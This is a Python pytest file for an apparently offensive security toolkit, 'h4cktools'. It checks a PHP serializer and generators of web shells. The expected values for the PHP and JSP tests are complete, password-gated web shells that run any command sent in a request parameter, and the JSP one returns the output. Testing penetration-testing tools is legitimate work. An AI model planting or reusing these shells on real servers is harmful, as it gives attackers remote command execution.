import os
import sys
import pytest

h4cktools_path = os.path.abspath(
    os.path.join(os.path.dirname(__file__), "..", "..")
)
sys.path.append(h4cktools_path)

from h4cktools.generate.code import (
    randnum, phpserialize, phpwebshell, jspwebshell, warwebshell
)

class Test:
    public = "a"
    _protected = "b"
    __private = "c"

    def get_private(self):
        return self.__private

def test_randnum():
    assert len(randnum(5)) == 5 

@pytest.mark.parametrize(
    "obj, result", 
    [
        (None, "N;"),
        (True, "b:1;"),
        (1, "i:1;"), 
        (1.0, "d:1.0;"),
        ("test", "s:4:\"test\";"),
        (["a", "b", "c"], "a:3:{i:0;s:1:\"a\";i:1;s:1:\"b\";i:2;s:1:\"c\";}"),
        (
            {"a": 1, "b": 2, "c": 3}, 
            "a:3:{s:1:\"a\";i:1;s:1:\"b\";i:2;s:1:\"c\";i:3;}"
        ),
        (
            Test(),
            "O:4:\"Test\":3:{s:6:\"public\";s:1:\"a\";s:12:\"\0*\0protected\";"
            "s:1:\"b\";s:13:\"\0Test\0private\";s:1:\"c\";}"
        )
    ]
)
def test_phpserialize(obj, result):
    assert phpserialize(obj) == result

def test_phpwebshell():
    password = "TESTPASS"
    command = "TESTCMD"
    shell = (
        "<?php if (isset($_REQUEST[\"pwd\"]) "
        f"&& md5($_REQUEST[\"pwd\"]) === \"ef5d486ceb651f33e1209920e74a6a5a\")"
        " { if (isset($_REQUEST[\"cmd\"])) TESTCMD($_REQUEST[\"cmd\"]); } ?>"
    )
    assert phpwebshell(password=password, command=command) == shell

def test_jspwebshell():
    password = "TESTPASS"
    shell = (
        "<%@page import=\"java.util.*,java.io.*,java.security.MessageDigest"
        "\"%><% if (request.getParameter(\"pwd\") != null) "
        "{String pwd = request.getParameter(\"pwd\");"
        "MessageDigest mdAlgorithm = MessageDigest.getInstance(\"MD5\");"
        "mdAlgorithm.update(pwd.getBytes());"
        "byte[] digest = mdAlgorithm.digest();"
        "StringBuffer hexString = new StringBuffer();"
        "for (int i = 0; i < digest.length; i++) {"
        "pwd = Integer.toHexString(0xFF & digest[i]);"
        "if (pwd.length() < 2) { pwd = \"0\" + pwd; }"
        "hexString.append(pwd); }"
        "if (hexString.toString().equals(\"ef5d486ceb651f33e1209920e74a6a5a\""
        ")) {if (request.getParameter(\"cmd\") != null) {"
        "Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));"
        "DataInputStream dis = new DataInputStream(p.getInputStream());"
        "String disr = dis.readLine();while(disr != null){out.println(disr);"
        "disr = dis.readLine();}p.destroy();}} }%>"
    )
    assert jspwebshell(password=password) == shell

def test_warwebshell(tmp_path):
    d = tmp_path / "sub"
    d.mkdir()
    p = d / "testshell.war"
    warwebshell(path=p)